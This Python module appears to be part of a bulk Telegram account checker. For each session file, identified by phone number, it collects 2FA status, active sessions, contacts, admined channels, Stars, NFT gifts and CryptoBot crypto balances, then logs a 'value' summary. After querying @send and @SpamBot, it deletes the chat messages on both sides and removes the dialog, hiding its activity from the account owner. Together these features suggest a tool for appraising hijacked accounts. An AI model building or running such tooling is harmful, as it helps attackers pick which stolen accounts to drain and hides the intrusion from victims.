import asyncio
import re
import time
import os
from telethon.tl.functions.payments import GetStarsStatusRequest, GetSavedStarGiftsRequest
from telethon.tl.functions.account import GetPasswordRequest, GetAuthorizationsRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerSelf, InputPeerEmpty
from .config import NFT_SERIAL_THRESHOLD, CHECK_GIFTS, CHECK_CRYPTOBOT, CHECK_SPAMBOT, \
    CHECK_2FA, CHECK_FULL_INFO, CHECK_ADMIN, RESULTS_FILE, BASE_DIR
from .utils import async_timeout


async def _cleanup_bot_dialog(client, entity, msg_limit: int = 30):
    """Delete recent messages in a bot chat (both sides), then remove dialog."""
    try:
        messages = await client.get_messages(entity, limit=msg_limit)
        if messages:
            ids = [msg.id for msg in messages]
            await client.delete_messages(entity, ids, revoke=True)
    except Exception:
        pass
    try:
        await client.delete_dialog(entity)
    except Exception:
        pass


async def get_stars_balance(client) -> int:
    try:
        status = await client(GetStarsStatusRequest(peer=InputPeerSelf()))
        balance_obj = getattr(status, 'balance', None)
        return balance_obj.amount if balance_obj and hasattr(balance_obj, 'amount') else 0
    except Exception:
        return 0


async def get_gifts_info(client) -> dict:
    try:
        result = await client(GetSavedStarGiftsRequest(
            peer=InputPeerSelf(),
            offset='',
            limit=200,
            exclude_unsaved=False,
            exclude_saved=False,
            exclude_unlimited=False,
            exclude_unique=False
        ))
        gifts = result.gifts if hasattr(result, 'gifts') else []
        nft_count = 0
        gift_count = 0
        gifts_stars_value = 0
        for gift in gifts:
            try:
                serial_num = getattr(gift.gift, 'num', getattr(gift.gift, 'id', 0))
                convert_stars = getattr(gift, 'convert_stars', 0)
                if serial_num and serial_num < NFT_SERIAL_THRESHOLD:
                    nft_count += 1
                else:
                    gift_count += 1
                    if isinstance(convert_stars, int):
                        gifts_stars_value += convert_stars
            except Exception:
                continue
        return {"nft_count": nft_count, "gift_count": gift_count, "gifts_stars_value": gifts_stars_value}
    except Exception:
        return {"nft_count": 0, "gift_count": 0, "gifts_stars_value": 0}


async def get_cryptobot_balance(client) -> dict:
    """Check CryptoBot balance — read only, cleans up messages after."""
    result = {"usdt": 0.0, "ton": 0.0}
    entity = None
    try:
        for _ in range(2):
            try:
                async with async_timeout(5):
                    entity = await client.get_input_entity("@send")
                break
            except Exception:
                await asyncio.sleep(1)
        if not entity:
            return result

        sent_msg = await client.send_message(entity, "/wallet")
        await asyncio.sleep(3)
        messages = await client.get_messages(entity, limit=5)

        txt = ""
        for msg in messages:
            if msg.message and ("USDT" in msg.message or "TON" in msg.message):
                txt = msg.message.replace(",", "")
                break

        for pat in [r"Tether[:\s]+([\d.]+)\s*USDT", r"([\d.]+)\s*USDT"]:
            m = re.search(pat, txt, re.IGNORECASE)
            if m:
                try:
                    result["usdt"] = float(m.group(1))
                    break
                except ValueError:
                    pass

        for pat in [r"Toncoin[:\s]+([\d.]+)\s*TON", r"([\d.]+)\s*TON"]:
            m = re.search(pat, txt, re.IGNORECASE)
            if m:
                try:
                    result["ton"] = float(m.group(1))
                    break
                except ValueError:
                    pass
    except Exception:
        pass
    finally:
        if entity:
            await _cleanup_bot_dialog(client, entity)
    return result


async def check_spambot(client) -> str:
    """Check spam/restriction status via @SpamBot. Returns: clean / spam / unknown."""
    entity = None
    try:
        for _ in range(2):
            try:
                async with async_timeout(5):
                    entity = await client.get_input_entity("@SpamBot")
                break
            except Exception:
                await asyncio.sleep(1)
        if not entity:
            return "unknown"

        await client.send_message(entity, "/start")
        await asyncio.sleep(3)
        messages = await client.get_messages(entity, limit=5)

        status = "unknown"
        for msg in messages:
            if msg.message and not msg.out:
                text = msg.message.lower()
                if any(x in text for x in ["no limits", "good news", "нет ограничений", "не ограничен"]):
                    status = "clean"
                elif any(x in text for x in ["spam", "limited", "ограничен", "spam reported"]):
                    status = "spam"
                break
    except Exception:
        status = "unknown"
    finally:
        if entity:
            await _cleanup_bot_dialog(client, entity)
    return status


async def count_dialogs(client) -> int:
    try:
        result = await client(GetDialogsRequest(
            offset_date=0, offset_id=0, offset_peer=InputPeerEmpty(),
            limit=1, hash=0
        ))
        return getattr(result, 'count', len(getattr(result, 'dialogs', [])))
    except Exception:
        return 0


async def check_admin_status(client) -> dict:
    """Get public channels and groups where account is admin."""
    ch_admin = {}
    gr_admin = {}
    try:
        result = await client(GetAdminedPublicChannelsRequest(
            by_location=False, check_limit=False
        ))
        for ch in result.chats:
            url = f"https://t.me/{ch.username}" if getattr(ch, 'username', None) else f"id:{ch.id}"
            count = getattr(ch, 'participants_count', 0) or 0
            if getattr(ch, 'broadcast', False):
                ch_admin[url] = count
            else:
                gr_admin[url] = count
    except Exception:
        pass
    return {"ch_admin": ch_admin, "gr_admin": gr_admin}


async def get_2fa_status(client) -> bool:
    try:
        pwd = await client(GetPasswordRequest())
        return pwd.has_password
    except Exception:
        return False


async def get_full_info(client, me) -> dict:
    """Get bio, profile photo presence, active sessions count, contacts count."""
    info = {
        "bio": "",
        "has_photo": False,
        "sessions_count": 0,
        "contacts_count": 0,
    }
    try:
        full = await client(GetFullUserRequest(me))
        info["bio"] = getattr(full.full_user, 'about', '') or ''
        info["has_photo"] = me.photo is not None
    except Exception:
        pass
    try:
        auths = await client(GetAuthorizationsRequest())
        info["sessions_count"] = len(auths.authorizations)
    except Exception:
        pass
    try:
        contacts = await client(GetContactsRequest(hash=0))
        info["contacts_count"] = len(contacts.contacts) if hasattr(contacts, 'contacts') else 0
    except Exception:
        pass
    return info


async def check_account(client, phone_number) -> dict:
    info = {
        "phone": phone_number,
        "id": None,
        "username": "",
        "first_name": "",
        "last_name": "",
        "is_premium": False,
        "bio": "",
        "has_photo": False,
        "has_2fa": False,
        "sessions_count": 0,
        "contacts_count": 0,
        "dialogs_count": 0,
        "spam_status": "unknown",
        "ch_admin": {},
        "gr_admin": {},
        "stars_balance": 0,
        "nft_count": 0,
        "gift_count": 0,
        "gifts_stars_value": 0,
        "usdt_balance": 0.0,
        "ton_balance": 0.0,
        "checked_at": int(time.time()),
    }

    try:
        me = await client.get_me()
        info["id"] = me.id
        info["username"] = me.username or ""
        info["first_name"] = me.first_name or ""
        info["last_name"] = me.last_name or ""
        info["is_premium"] = bool(me.premium)
    except Exception as e:
        print(f"[{phone_number}] Ошибка получения данных: {e}")
        return info

    if CHECK_FULL_INFO:
        try:
            async with async_timeout(15):
                full = await get_full_info(client, me)
                info.update(full)
        except Exception:
            pass

    if CHECK_2FA:
        try:
            async with async_timeout(10):
                info["has_2fa"] = await get_2fa_status(client)
        except Exception:
            pass

    try:
        async with async_timeout(10):
            info["stars_balance"] = await get_stars_balance(client)
    except Exception:
        pass

    if CHECK_GIFTS:
        try:
            async with async_timeout(15):
                info.update(await get_gifts_info(client))
        except Exception:
            pass

    try:
        async with async_timeout(10):
            info["dialogs_count"] = await count_dialogs(client)
    except Exception:
        pass

    if CHECK_ADMIN:
        try:
            async with async_timeout(15):
                admin = await check_admin_status(client)
                info["ch_admin"] = admin["ch_admin"]
                info["gr_admin"] = admin["gr_admin"]
        except Exception:
            pass

    if CHECK_SPAMBOT:
        try:
            async with async_timeout(25):
                info["spam_status"] = await check_spambot(client)
        except Exception:
            pass

    if CHECK_CRYPTOBOT:
        try:
            async with async_timeout(25):
                crypto = await get_cryptobot_balance(client)
                info["usdt_balance"] = crypto["usdt"]
                info["ton_balance"] = crypto["ton"]
        except Exception:
            pass

    return info


def format_account_info(info: dict, source: str = "") -> str:
    spam = info.get("spam_status", "unknown")
    spam_tag = {"clean": "[CLEAN]", "spam": "[SPAM] ", "unknown": "[?]   "}.get(spam, "[?]   ")

    name = f"{info.get('first_name', '')} {info.get('last_name', '')}".strip() or "—"
    username = f"@{info['username']}" if info.get('username') else "—"

    flags = []
    if info.get('is_premium'):   flags.append("PREMIUM")
    if info.get('has_2fa'):      flags.append("2FA")
    if not info.get('has_photo'): flags.append("NO PHOTO")
    flags_str = "  ".join(flags) if flags else "—"

    worth = []
    if info.get('stars_balance', 0) > 0:
        worth.append(f"{info['stars_balance']} stars")
    if info.get('nft_count', 0) > 0:
        worth.append(f"{info['nft_count']} NFT")
    if info.get('gift_count', 0) > 0:
        worth.append(f"{info['gift_count']} gifts ({info['gifts_stars_value']}⭐)")
    if info.get('usdt_balance', 0.0) > 0:
        worth.append(f"{info['usdt_balance']:.4f} USDT")
    if info.get('ton_balance', 0.0) > 0:
        worth.append(f"{info['ton_balance']:.4f} TON")
    worth_str = "  ".join(worth) if worth else "пусто"

    sep = "─" * 52
    lines = [
        sep,
        f"  {spam_tag}  +{info['phone']}  |  {username}",
        f"  Имя: {name}  |  ID: {info['id']}",
        f"  Флаги:    {flags_str}",
        f"  Сессий:   {info.get('sessions_count', 0)}  |  Контактов: {info.get('contacts_count', 0)}  |  Диалогов: {info.get('dialogs_count', 0)}",
        f"  Ценность: {worth_str}",
    ]
    if info.get('bio'):
        bio_short = info['bio'][:55] + ('...' if len(info['bio']) > 55 else '')
        lines.append(f"  Bio:      {bio_short}")
    ch = info.get('ch_admin', {})
    gr = info.get('gr_admin', {})
    if ch:
        lines.append(f"  Каналы:   {len(ch)} admin — " + ", ".join(list(ch.keys())[:3]))
    if gr:
        lines.append(f"  Группы:   {len(gr)} admin — " + ", ".join(list(gr.keys())[:3]))
    if source:
        lines.append(f"  Файл:     {source}")

    return "\n".join(lines)


def load_checked_phones() -> set:
    """Load phones already present in results.txt for resume support."""
    phones = set()
    results_path = os.path.join(BASE_DIR, RESULTS_FILE)
    if not os.path.exists(results_path):
        return phones
    try:
        with open(results_path, "r", encoding="utf-8") as f:
            next(f, None)  # skip header
            for line in f:
                parts = line.strip().split('\t')
                if parts and parts[0]:
                    phones.add(parts[0].lstrip('+'))
    except Exception:
        pass
    return phones


def save_to_results(info: dict):
    try:
        results_path = os.path.join(BASE_DIR, RESULTS_FILE)
        write_header = not os.path.exists(results_path) or os.path.getsize(results_path) == 0
        with open(results_path, "a", encoding="utf-8") as f:
            if write_header:
                f.write(
                    "phone\tid\tusername\tfirst_name\tlast_name\tis_premium\t"
                    "has_2fa\tspam_status\thas_photo\tsessions\tcontacts\tdialogs\tbio\t"
                    "stars\tnft_count\tgift_count\tgifts_stars_value\tusdt\tton\t"
                    "ch_admin_count\tgr_admin_count\tchecked_at\n"
                )
            bio_clean = info.get('bio', '').replace('\t', ' ').replace('\n', ' ')
            ch_admin = info.get('ch_admin', {})
            gr_admin = info.get('gr_admin', {})
            f.write(
                f"+{info['phone']}\t{info['id']}\t{info.get('username', '')}\t"
                f"{info.get('first_name', '')}\t{info.get('last_name', '')}\t"
                f"{'Yes' if info['is_premium'] else 'No'}\t"
                f"{'Yes' if info['has_2fa'] else 'No'}\t{info.get('spam_status', 'unknown')}\t"
                f"{'Yes' if info.get('has_photo') else 'No'}\t{info.get('sessions_count', 0)}\t"
                f"{info.get('contacts_count', 0)}\t{info.get('dialogs_count', 0)}\t{bio_clean}\t"
                f"{info['stars_balance']}\t{info['nft_count']}\t{info['gift_count']}\t"
                f"{info['gifts_stars_value']}\t{info['usdt_balance']:.6f}\t"
                f"{info['ton_balance']:.6f}\t{len(ch_admin)}\t{len(gr_admin)}\t"
                f"{info['checked_at']}\n"
            )
    except Exception as e:
        print(f"Ошибка сохранения результата: {e}")
